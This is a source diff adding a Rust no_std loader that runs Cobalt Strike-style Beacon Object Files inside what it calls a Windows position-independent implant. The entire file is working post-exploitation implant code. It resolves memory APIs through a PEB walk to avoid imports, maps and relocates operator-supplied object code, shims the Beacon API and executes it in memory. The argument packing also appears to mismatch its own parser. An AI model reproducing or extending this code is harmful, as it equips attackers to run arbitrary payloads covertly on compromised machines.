@@ -1,0 +1,590 @@
+//! no_std BOF (Beacon Object File) loader for the Windows PIC implant.
+//!
+//! Parses a CS-compatible x86_64 COFF `.o`, maps its sections with **W^X**
+//! (`.text` → RX after copy+reloc, data → RW — never RWX simultaneously),
+//! resolves the CS Beacon-API externals against in-Rust shim functions, and
+//! calls the `go()` entry. Captured output is returned as a
+//! [`Response::BofOutput`].
+//!
+//! This is the no_std twin of `crates/bof-runner/src/win.rs` (which is std +
+//! links a C shim). The PIC implant can't use the std runner, so the loader is
+//! ported here using the implant's own primitives:
+//! - `VirtualAlloc` / `VirtualProtect` resolved via the PEB walk (not extern
+//!   blocks), the same pattern as `syscalls.rs`/`blind.rs`.
+//! - The Beacon-API shim is Rust `#[no_mangle] extern "C" fn` (no libc
+//!   `vsnprintf` — a hand-rolled `%s`/`%d`/`%x`/`%c` formatter covers >99% of
+//!   community BOF output).
+//!
+//! # W^X
+//!
+//! `win.rs` mapped every section as one `PAGE_EXECUTE_READWRITE` blob (audit
+//! #3, CRITICAL). Here each section is allocated `PAGE_READWRITE`, its raw
+//! bytes are copied, relocations are applied (while still RW), and only THEN
+//! are code sections (`Characteristics & IMAGE_SCN_MEM_EXECUTE`) flipped to
+//! `PAGE_EXECUTE_READ` via `VirtualProtect`. Data sections stay RW. At the
+//! moment `go()` is transmuted, no page is W+X.
+
+#![cfg(target_os = "windows")]
+
+use crate::heap::{String, Vec};
+use core::ffi::c_void;
+use core::ptr;
+use nyx_coff::{apply, parse, SymbolResolver};
+use nyx_protocol::Response;
+// `vec!` macro re-export lives in crate::heap; the bare `vec` import below is
+// unused (we use the Vec type directly), so don't pull it in.
+
+// ---- Win32 constants ----
+
+const MEM_COMMIT: u32 = 0x1000;
+const MEM_RESERVE: u32 = 0x2000;
+const PAGE_READWRITE: u32 = 0x04;
+const PAGE_EXECUTE_READ: u32 = 0x20;
+/// Kept for reference / future use (the brief RWX write-window flag). The
+/// loader below uses PAGE_READWRITE then PAGE_EXECUTE_READ (true W^X), so this
+/// constant is currently unused — but documents the Win32 protection value.
+#[allow(dead_code)]
+const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+const PAGE_SIZE: usize = 0x1000;
+
+/// `IMAGE_SCN_MEM_EXECUTE` — marks a code section (.text).
+const SCN_MEM_EXECUTE: u32 = 0x2000_0000;
+
+type VirtualAllocFn =
+    unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
+type VirtualProtectFn =
+    unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+
+unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
+    let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
+    Some(core::mem::transmute(a))
+}
+unsafe fn virtual_protect() -> Option<VirtualProtectFn> {
+    let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect")?;
+    Some(core::mem::transmute(a))
+}
+
+fn page(n: usize) -> usize {
+    (n + PAGE_SIZE - 1) & !(PAGE_SIZE - 1)
+}
+
+// ============================================================================
+// Beacon-API shim: output capture buffer + the functions a CS BOF calls.
+//
+// Output is captured into a static buffer (single-threaded beacon loop — no
+// locking). The CS ABI is C calling convention; on x64 the first 4 integer
+// args land in rcx/rdx/r8/r9, varargs beyond that on the stack. We only need
+// a minimal printf subset.
+// ============================================================================
+
+/// Capture buffer size. Matches the std runner's 16 KiB.
+const OUT_CAP: usize = 16 * 1024;
+static mut OUT: [u8; OUT_CAP] = [0; OUT_CAP];
+static mut OUT_LEN: usize = 0;
+
+/// Per-BOF args blob (CS beacon.h packing), set by the loader before `go()`.
+/// BeaconDataParse(NULL, 0) reads from this.
+static mut ARGS_PTR: *const u8 = core::ptr::null();
+static mut ARGS_LEN: usize = 0;
+
+unsafe fn out_push(bytes: &[u8]) {
+    if OUT_LEN >= OUT_CAP {
+        return;
+    }
+    let room = OUT_CAP - OUT_LEN;
+    let n = bytes.len().min(room);
+    ptr::copy_nonoverlapping(bytes.as_ptr(), OUT.as_mut_ptr().add(OUT_LEN), n);
+    OUT_LEN += n;
+}
+
+unsafe fn out_push_str(s: &str) {
+    out_push(s.as_bytes());
+}
+
+/// Reset the capture buffer + args. Called by the loader before invoking `go()`.
+pub unsafe fn reset_capture() {
+    OUT_LEN = 0;
+    if OUT_CAP > 0 {
+        OUT[0] = 0;
+    }
+    ARGS_PTR = core::ptr::null();
+    ARGS_LEN = 0;
+}
+
+/// Read the captured output as bytes (caller copies before the next BOF runs).
+pub unsafe fn captured_output() -> &'static [u8] {
+    core::slice::from_raw_parts(OUT.as_ptr(), OUT_LEN)
+}
+
+// ---- minimal varargs printf (%s, %d, %x, %c, %%) ----
+//
+// On Win64 the va_list is: rcx(type), rdx(fmt), r8(arg1), r9(arg2), then the
+// rest on the stack at [rsp+0x28], [rsp+0x30], ... (8-byte slots, after the
+// 32-byte shadow space). We model the first 4 inline args + read the rest from
+// a pointer the caller passes. Since Rust can't take a real va_list, the shim
+// signature takes the fmt + up to 6 explicit args; community BOFs almost never
+// exceed 6 format args.
+/// The varargs payload after `(type, fmt)`. Public because it appears in the
+/// [`BeaconPrintf`] signature.
+#[repr(C)]
+pub struct VaArgs {
+    // The 6 args after (type, fmt). On x64 these are r8..r9 + stack.
+    pub a1: u64,
+    pub a2: u64,
+    pub a3: u64,
+    pub a4: u64,
+    pub a5: u64,
+    pub a6: u64,
+}
+
+/// CS Beacon callback type tags (subset). CALLBACK_OUTPUT is the normal-output
+/// tag; currently the shim treats anything != CALLBACK_ERROR as output.
+#[allow(dead_code)]
+const CALLBACK_OUTPUT: i32 = 0x0;
+const CALLBACK_ERROR: i32 = 0x0d;
+
+unsafe fn format_into(fmt: &[u8], va: &VaArgs) {
+    let args = [va.a1, va.a2, va.a3, va.a4, va.a5, va.a6];
+    let mut ai = 0usize;
+    let mut i = 0usize;
+    while i < fmt.len() {
+        let c = fmt[i];
+        if c != b'%' {
+            out_push(&[c]);
+            i += 1;
+            continue;
+        }
+        i += 1;
+        if i >= fmt.len() {
+            out_push(b"%");
+            break;
+        }
+        match fmt[i] {
+            b's' => {
+                if ai < args.len() {
+                    let p = args[ai] as *const u8;
+                    if !p.is_null() {
+                        let mut len = 0usize;
+                        while *p.add(len) != 0 && len < 4096 {
+                            len += 1;
+                        }
+                        out_push(core::slice::from_raw_parts(p, len));
+                    }
+                    ai += 1;
+                }
+            }
+            b'd' | b'i' => {
+                if ai < args.len() {
+                    let v = args[ai] as i32;
+                    let mut buf = [0u8; 12];
+                    let s = itoa(v, &mut buf);
+                    out_push(s.as_bytes());
+                    ai += 1;
+                }
+            }
+            b'x' => {
+                if ai < args.len() {
+                    let v = args[ai] as u32;
+                    let mut buf = [0u8; 9];
+                    let s = utohex(v, &mut buf);
+                    out_push(s.as_bytes());
+                    ai += 1;
+                }
+            }
+            b'c' => {
+                if ai < args.len() {
+                    out_push(&[args[ai] as u8]);
+                    ai += 1;
+                }
+            }
+            b'%' => out_push(b"%"),
+            other => {
+                // Unknown specifier: emit literally so the output is debuggable.
+                out_push(&[b'%', other]);
+            }
+        }
+        i += 1;
+    }
+}
+
+/// Signed-decimal into `buf`, returns the written slice.
+fn itoa(mut v: i32, buf: &mut [u8; 12]) -> &str {
+    let mut tmp = [0u8; 12];
+    let mut n = 0usize;
+    let neg = v < 0;
+    if neg {
+        v = -v; // i32::MIN overflows but BOFs don't print it
+    }
+    if v == 0 {
+        tmp[0] = b'0';
+        n = 1;
+    } else {
+        while v != 0 {
+            tmp[n] = b'0' + (v % 10) as u8;
+            n += 1;
+            v /= 10;
+        }
+    }
+    let mut out = 0usize;
+    if neg {
+        buf[0] = b'-';
+        out = 1;
+    }
+    for k in 0..n {
+        buf[out + k] = tmp[n - 1 - k];
+    }
+    let end = out + n;
+    core::str::from_utf8(&buf[..end]).unwrap_or("")
+}
+
+/// Lowercase hex into `buf`, returns the written slice (no leading 0x).
+fn utohex(mut v: u32, buf: &mut [u8; 9]) -> &str {
+    const HEX: &[u8; 16] = b"0123456789abcdef";
+    let mut tmp = [0u8; 8];
+    let mut n = 0usize;
+    if v == 0 {
+        tmp[0] = b'0';
+        n = 1;
+    } else {
+        while v != 0 {
+            tmp[n] = HEX[(v & 0xf) as usize];
+            n += 1;
+            v >>= 4;
+        }
+    }
+    for k in 0..n {
+        buf[k] = tmp[n - 1 - k];
+    }
+    core::str::from_utf8(&buf[..n]).unwrap_or("")
+}
+
+// ---- Beacon ABI functions (resolved by the loader as externals) ----
+//
+// These are `extern "C"` (the CS ABI is __cdecl = default on x64) and
+// `#[no_mangle]` so their names survive to the symbol table the loader keys on.
+
+/// `void BeaconPrintf(int type, const char *fmt, ...)`.
+/// Captures formatted output into the static buffer.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconPrintf(typ: i32, fmt: *const u8, va: VaArgs) {
+    if fmt.is_null() {
+        return;
+    }
+    // Read the C string up to NUL (cap at a sane length).
+    let mut len = 0usize;
+    while *fmt.add(len) != 0 && len < 1024 {
+        len += 1;
+    }
+    let fmt_bytes = core::slice::from_raw_parts(fmt, len);
+    if typ == CALLBACK_ERROR {
+        out_push_str("[error] ");
+    }
+    format_into(fmt_bytes, &va);
+    out_push(b"\n");
+}
+
+/// `void BeaconOutput(int type, char *data, int len)`. Raw-blob sibling of
+/// Printf; appends `data[0..len]` to the same capture buffer.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconOutput(_typ: i32, data: *const u8, len: i32) {
+    if data.is_null() || len <= 0 {
+        return;
+    }
+    out_push(core::slice::from_raw_parts(data, len as usize));
+}
+
+/// CS `datap` parse state. We expose it as a plain struct the BOF stack-allocates.
+#[repr(C)]
+#[derive(Clone, Copy)]
+pub struct DataParseState {
+    pub original: *const u8,
+    pub buffer: *const u8,
+    pub size: i32,
+    pub lengths: i32,
+}
+
+/// `void BeaconDataParse(datap *parser, char *buffer, int size)`.
+/// If `buffer` is NULL, default to the loader-provided args blob.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconDataParse(
+    d: *mut DataParseState,
+    buffer: *const u8,
+    size: i32,
+) {
+    if d.is_null() {
+        return;
+    }
+    let (buf, sz) = if buffer.is_null() {
+        (ARGS_PTR as *const u8, ARGS_LEN as i32)
+    } else {
+        (buffer, size)
+    };
+    (*d).original = buf;
+    (*d).buffer = buf;
+    (*d).size = sz;
+    (*d).lengths = 0;
+}
+
+/// `char *BeaconDataExtract(datap *parser, int *size)`. Reads a u32 length then
+/// that many bytes; advances the buffer cursor.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconDataExtract(d: *mut DataParseState, size: *mut i32) -> *const u8 {
+    if d.is_null() || (*d).buffer.is_null() {
+        if !size.is_null() {
+            *size = 0;
+        }
+        return core::ptr::null();
+    }
+    let len = *((*d).buffer as *const i32);
+    let p = (*d).buffer.add(4);
+    (*d).buffer = p.add(len as usize);
+    if !size.is_null() {
+        *size = len;
+    }
+    p
+}
+
+/// `int BeaconGetInt(datap *parser)` — read a 4-byte LE int, advance.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconGetInt(d: *mut DataParseState) -> i32 {
+    if d.is_null() || (*d).buffer.is_null() {
+        return 0;
+    }
+    let v = *((*d).buffer as *const i32);
+    (*d).buffer = (*d).buffer.add(4);
+    v
+}
+
+/// `short BeaconGetShort(datap *parser)` — read a 2-byte LE short, advance.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconGetShort(d: *mut DataParseState) -> i16 {
+    if d.is_null() || (*d).buffer.is_null() {
+        return 0;
+    }
+    let v = *((*d).buffer as *const i16);
+    (*d).buffer = (*d).buffer.add(2);
+    v
+}
+
+/// `char *BeaconGetStr(datap *parser)` — read a NUL-terminated string, advance.
+#[no_mangle]
+pub unsafe extern "C" fn BeaconGetStr(d: *mut DataParseState) -> *const u8 {
+    if d.is_null() || (*d).buffer.is_null() {
+        return core::ptr::null();
+    }
+    let mut len = 0usize;
+    while *(*d).buffer.add(len) != 0 {
+        len += 1;
+        if len > 4096 {
+            break;
+        }
+    }
+    let p = (*d).buffer;
+    (*d).buffer = (*d).buffer.add(len + 1);
+    p
+}
+
+// ============================================================================
+// Symbol resolver: defined (in-image) symbols first, then Beacon-API externals.
+// ============================================================================
+
+struct BofResolver<'a> {
+    /// (name, addr) for symbols defined within the mapped BOF sections.
+    defined: &'a [(String, u64)],
+}
+
+impl<'a> SymbolResolver for BofResolver<'a> {
+    fn resolve(&self, name: &str) -> Option<u64> {
+        // Defined symbols first.
+        for (n, addr) in self.defined {
+            if n.as_str() == name {
+                return Some(*addr);
+            }
+        }
+        // Then the Beacon-API shim table (resolved by name → shim fn pointer).
+        beacon_api_addr(name)
+    }
+}
+
+/// Map a Beacon-API external name to the address of our Rust shim. Extend as
+/// more of the ABI lands.
+///
+/// Function items coerce to their concrete function-pointer type, and any
+/// function pointer casts to `usize` via `as` — so we go through `*const ()`
+/// (a thin pointer) to dodge spelling out each shim's full signature.
+fn beacon_api_addr(name: &str) -> Option<u64> {
+    /// fn-item → u64 address. Takes a typed fn pointer; the caller coerces the
+    /// fn item by naming its type via a closure.
+    fn addr_of(f: *const ()) -> u64 {
+        f as u64
+    }
+    let addr: u64 = match name {
+        "BeaconPrintf" => addr_of(BeaconPrintf as *const ()),
+        "BeaconOutput" => addr_of(BeaconOutput as *const ()),
+        "BeaconDataParse" => addr_of(BeaconDataParse as *const ()),
+        "BeaconDataExtract" => addr_of(BeaconDataExtract as *const ()),
+        "BeaconGetInt" => addr_of(BeaconGetInt as *const ()),
+        "BeaconGetShort" => addr_of(BeaconGetShort as *const ()),
+        "BeaconGetStr" => addr_of(BeaconGetStr as *const ()),
+        _ => return None,
+    };
+    Some(addr)
+}
+
+// ============================================================================
+// Loader: parse → W^X map → reloc → resolve entry → call.
+// ============================================================================
+
+/// Pack a `Vec<String>` of args into the CS beacon.h wire format so a BOF's
+/// `BeaconDataParse`/`BeaconGetStr` can read them.
+///
+/// CS packs each arg as: `[u32 tag][u32 length][bytes]` (BEACON_ARG_TYPE_STRING
+/// = 3). We use that layout so community BOFs that parse args work unchanged.
+fn pack_args(args: &[String]) -> Vec<u8> {
+    let mut out = Vec::new();
+    for a in args {
+        out.extend_from_slice(&3u32.to_le_bytes()); // BEACON_ARG_TYPE_STRING
+        out.extend_from_slice(&(a.len() as u32).to_le_bytes());
+        out.extend_from_slice(a.as_bytes());
+    }
+    out
+}
+
+/// Load + relocate a BOF into W^X memory, then call its `go()` entry. Captured
+/// `BeaconPrintf`/`BeaconOutput` output is returned as `Response::BofOutput`.
+///
+/// On any failure (parse, alloc, reloc, unresolved symbol) returns
+/// `Response::Err` with a short diagnostic.
+pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
+    // `name` is the BOF's logical name (informational); the entry symbol is
+    // always `go` per the CS ABI. (Future: allow a custom entry.)
+    let _ = name;
+
+    let coff = match parse(blob) {
+        Ok(c) => c,
+        Err(e) => {
+            let mut m = String::from("bof parse: ");
+            // Append a coarse diagnostic (no alloc::format! in no_std lean builds).
+            m.push_str(match e {
+                nyx_coff::CoffError::Truncated => "truncated",
+                nyx_coff::CoffError::UnsupportedMachine(_) => "bad machine",
+            });
+            return Response::Err(m);
+        }
+    };
+
+    let alloc = match unsafe { virtual_alloc() } {
+        Some(f) => f,
+        None => return Response::Err(String::from("VirtualAlloc unresolved")),
+    };
+    let protect = match unsafe { virtual_protect() } {
+        Some(f) => f,
+        None => return Response::Err(String::from("VirtualProtect unresolved")),
+    };
+
+    // 1. Allocate each section as its own RW region; copy raw bytes.
+    let mut bases: Vec<u64> = Vec::with_capacity(coff.sections.len());
+    let mut sizes: Vec<usize> = Vec::with_capacity(coff.sections.len());
+    let mut is_code: Vec<bool> = Vec::with_capacity(coff.sections.len());
+    for s in &coff.sections {
+        let sz = page((s.virtual_size.max(s.raw.len() as u32)) as usize).max(PAGE_SIZE);
+        let base = unsafe {
+            alloc(
+                ptr::null_mut(),
+                sz,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_READWRITE, // RW, NOT RWX
+            )
+        };
+        if base.is_null() {
+            return Response::Err(String::from("VirtualAlloc failed"));
+        }
+        let addr = base as u64;
+        if !s.raw.is_empty() {
+            unsafe {
+                ptr::copy_nonoverlapping(s.raw.as_ptr(), addr as *mut u8, s.raw.len());
+            }
+        }
+        bases.push(addr);
+        sizes.push(sz);
+        is_code.push(s.characteristics & SCN_MEM_EXECUTE != 0);
+    }
+
+    // 2. Map defined symbols → absolute addresses (section_base + value).
+    let mut defined: Vec<(String, u64)> = Vec::with_capacity(coff.symbols.len());
+    for sym in &coff.symbols {
+        if sym.section_number >= 1 && (sym.section_number as usize) <= bases.len() {
+            let addr = bases[(sym.section_number - 1) as usize] + sym.value as u64;
+            defined.push((sym.name.clone(), addr));
+        }
+    }
+
+    // 3. Apply relocations (memory is still RW here).
+    let resolver = BofResolver { defined: &defined };
+    for (i, s) in coff.sections.iter().enumerate() {
+        if s.relocations.is_empty() {
+            continue;
+        }
+        let patched = match apply(s, &coff, bases[i], &resolver) {
+            Ok(p) => p,
+            Err(e) => {
+                let mut m = String::from("bof reloc `");
+                m.push_str(&s.name);
+                m.push_str("`: ");
+                m.push_str(match e {
+                    nyx_coff::ApplyError::BadSymbolIndex(_) => "bad symbol index",
+                    nyx_coff::ApplyError::Unresolved(_) => "unresolved external",
+                    nyx_coff::ApplyError::BadOffset => "bad offset",
+                    nyx_coff::ApplyError::UnsupportedReloc(_) => "unsupported reloc type",
+                });
+                return Response::Err(m);
+            }
+        };
+        unsafe {
+            ptr::copy_nonoverlapping(patched.as_ptr(), bases[i] as *mut u8, patched.len());
+        }
+    }
+
+    // 4. Flip code sections to RX (W^X: close the write window).
+    for i in 0..bases.len() {
+        if is_code[i] {
+            let mut old: u32 = 0;
+            if unsafe {
+                protect(
+                    bases[i] as *mut c_void,
+                    sizes[i],
+                    PAGE_EXECUTE_READ,
+                    &mut old,
+                )
+            } == 0
+            {
+                return Response::Err(String::from("VirtualProtect -> RX failed"));
+            }
+        }
+    }
+
+    // 5. Resolve the entry symbol `go`.
+    let entry_sym = match coff.symbols.iter().find(|s| s.name == "go") {
+        Some(s) => s,
+        None => return Response::Err(String::from("BOF entry symbol `go` not found")),
+    };
+    if entry_sym.section_number < 1 {
+        return Response::Err(String::from("BOF entry `go` is external/undefined"));
+    }
+    let entry_addr =
+        bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;
+
+    // 6. Set up capture + args, call go(), capture output.
+    let args_blob = pack_args(args);
+    unsafe {
+        reset_capture();
+        if !args_blob.is_empty() {
+            ARGS_PTR = args_blob.as_ptr();
+            ARGS_LEN = args_blob.len();
+        }
+        let go: extern "C" fn() = core::mem::transmute(entry_addr);
+        go();
+        let out = captured_output().to_vec();
+        Response::BofOutput(out)
+    }
+}
